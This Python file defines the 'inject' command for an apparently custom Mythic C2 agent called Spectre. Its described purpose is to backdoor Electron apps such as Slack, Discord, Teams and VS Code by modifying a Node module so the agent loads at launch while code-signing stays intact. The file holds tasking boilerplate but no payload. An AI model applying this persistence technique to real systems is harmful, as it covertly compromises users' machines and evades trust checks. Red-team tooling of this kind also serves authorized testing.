"""Spectre - inject (Electron app backdoor) command definition."""
from mythic_container.MythicCommandBase import *


class InjectArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="app_name",
                type=ParameterType.ChooseOne,
                choices=["slack", "discord", "teams", "vscode", "custom"],
                description="Target Electron application to inject into",
                parameter_group_info=[ParameterGroupInfo(required=True)],
            ),
            CommandParameter(
                name="custom_path",
                type=ParameterType.String,
                description="Custom path to app.asar.unpacked (if app_name=custom)",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="target_module",
                type=ParameterType.String,
                description="Node module to backdoor (e.g., 'lodash/lodash.js')",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            self.load_args_from_json_string(self.command_line)


class InjectCommand(CommandBase):
    cmd = "inject"
    needs_admin = False
    help_cmd = "inject --app_name [slack|discord|teams|vscode|custom]"
    description = (
        "Inject the Spectre agent into a target Electron application. "
        "Modifies a JavaScript module in app.asar.unpacked/node_modules "
        "so the agent loads when the app starts. The app's legitimate "
        "code-signing signature remains intact."
    )
    version = 1
    author = "spectre-dev"
    argument_class = InjectArguments
    attackmapping = [
        "T1574.001",  # Hijack Execution Flow: DLL Search Order Hijacking
        "T1546",      # Event Triggered Execution
    ]

    async def create_go_tasking(self, taskData):
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True
        )
        app = taskData.args.get_arg("app_name")
        response.DisplayParams = f"Target: {app}"
        return response

    async def process_response(self, task, response):
        return PTTaskProcessResponseMessageResponse(
            TaskID=task.Task.ID, Success=True
        )
